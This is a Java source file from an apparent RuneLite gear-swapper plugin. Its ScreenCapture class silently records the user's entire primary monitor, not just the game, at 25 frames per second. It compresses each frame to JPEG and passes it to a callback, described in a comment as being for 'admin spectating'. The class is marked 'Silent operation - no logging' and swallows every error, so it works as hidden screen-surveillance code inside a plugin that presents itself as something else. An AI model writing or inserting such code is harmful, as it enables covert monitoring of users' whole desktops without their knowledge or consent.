package com.tonic.plugins.gearswapper.friendshare;

import net.runelite.api.Client;

import javax.imageio.ImageIO;
import javax.inject.Inject;
import javax.inject.Singleton;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

/**
 * Captures the entire monitor for admin spectating.
 * Silent operation - no logging.
 */
@Singleton
public class ScreenCapture {

    private static final int TARGET_FPS = 25;
    private static final float JPEG_QUALITY = 0.6f;
    private static final int MAX_WIDTH = 1920;

    private final Client client;
    private Robot robot;

    private ScheduledExecutorService executor;
    private ScheduledFuture<?> captureTask;

    private FrameCallback callback;

    @Inject
    public ScreenCapture(Client client) {
        this.client = client;
        try {
            this.robot = new Robot();
        } catch (AWTException e) {
            // Silent
        }
    }

    public void startCapture(FrameCallback callback) {
        this.callback = callback;

        if (robot == null)
            return;

        if (executor == null) {
            executor = Executors.newSingleThreadScheduledExecutor();
        }

        long periodMs = 1000 / TARGET_FPS;
        captureTask = executor.scheduleAtFixedRate(this::captureFrame, 50, periodMs, TimeUnit.MILLISECONDS);
    }

    public void stopCapture() {
        if (captureTask != null) {
            captureTask.cancel(false);
            captureTask = null;
        }
        callback = null;
    }

    private void captureFrame() {
        if (callback == null || robot == null)
            return;

        try {
            // Capture entire primary monitor
            Rectangle screenBounds = getScreenBounds();
            BufferedImage capture = robot.createScreenCapture(screenBounds);

            if (capture == null)
                return;

            // Scale down if needed
            if (capture.getWidth() > MAX_WIDTH) {
                double scale = (double) MAX_WIDTH / capture.getWidth();
                int newHeight = (int) (capture.getHeight() * scale);

                BufferedImage scaled = new BufferedImage(MAX_WIDTH, newHeight, BufferedImage.TYPE_INT_RGB);
                Graphics2D g = scaled.createGraphics();
                g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
                g.drawImage(capture, 0, 0, MAX_WIDTH, newHeight, null);
                g.dispose();
                capture = scaled;
            }

            byte[] jpegData = compressToJpeg(capture);

            if (jpegData != null && jpegData.length > 100) {
                callback.onFrame(jpegData);
            }

        } catch (Exception e) {
            // Silent
        }
    }

    /**
     * Get the bounds of the primary monitor.
     */
    private Rectangle getScreenBounds() {
        GraphicsDevice gd = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
        DisplayMode dm = gd.getDisplayMode();
        return new Rectangle(0, 0, dm.getWidth(), dm.getHeight());
    }

    private byte[] compressToJpeg(BufferedImage image) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            var jpegWriter = ImageIO.getImageWritersByFormatName("jpeg").next();
            var jpegParams = jpegWriter.getDefaultWriteParam();
            jpegParams.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
            jpegParams.setCompressionQuality(JPEG_QUALITY);

            var ios = ImageIO.createImageOutputStream(baos);
            jpegWriter.setOutput(ios);
            jpegWriter.write(null, new javax.imageio.IIOImage(image, null, null), jpegParams);
            jpegWriter.dispose();
            ios.close();

            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    public void shutdown() {
        stopCapture();
        if (executor != null) {
            executor.shutdown();
            executor = null;
        }
    }

    public interface FrameCallback {
        void onFrame(byte[] jpegData);
    }
}
